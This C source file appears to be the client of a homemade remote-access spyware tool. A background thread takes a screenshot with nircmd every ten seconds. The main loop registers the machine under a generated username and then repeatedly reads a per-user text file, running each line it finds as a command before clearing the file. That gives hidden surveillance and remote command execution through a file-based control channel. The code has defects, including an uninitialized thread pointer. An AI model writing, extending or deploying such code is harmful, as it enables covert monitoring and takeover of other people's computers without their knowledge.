#include <stdio.h>
#include <stdlib.h>
#include "makeUsername.h"
#include "sizeFixer.h"
#include "coder.h"
#include "emptyFileCheck.h"
#include "Execute.h"
#include <pthread.h>


void *func1() {
    while (1)
    {
        Nircmd("nircmd savescreenshot ~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png");
        Sleep(10000);
    }
    
}

void main() {


    pthread_t *th1;
    pthread_create(th1,NULL,func1, NULL);

    char *combined_username = makeUsername();

    sizeFixer(combined_username);
    // Format the file name
    char filename[100];
    snprintf(filename, sizeof(filename), "%s.txt", combined_username);

    // Check if username exists in Users.txt
    FILE *users_file = fopen("Users.txt", "r");
    BOOL username_exists = FALSE;
    char line[100];

    while (fgets(line, sizeof(line), users_file) != NULL) {
        sizeFixer(line);
        if (strcmp(line, combined_username) == 0) {
            username_exists = TRUE;
            break;
        }
    }
    fclose(users_file);

    // Add username to Users.txt if not found
    if (!username_exists) {
        users_file = fopen("Users.txt", "a");  // Open in append mode
        
        fprintf(users_file, "%s\n", combined_username);
        fclose(users_file);
    }

    // // Make a file with the username name
    FILE *user_specific_file = fopen(filename, "w");
    fclose(user_specific_file);

    while (1)
    {
        user_specific_file = fopen(filename, "r");

        // Check if file is empty
        if (!is_empty(user_specific_file)) {

            // Open the file in read mode
            fgets(line, sizeof(line), user_specific_file);
            //cipher(line, 1);

            Execute(line);

            fclose(user_specific_file);
            user_specific_file = fopen(filename, "w");
            fclose(user_specific_file);

            
        }

        Sleep(5000);
        
    
    }
    

}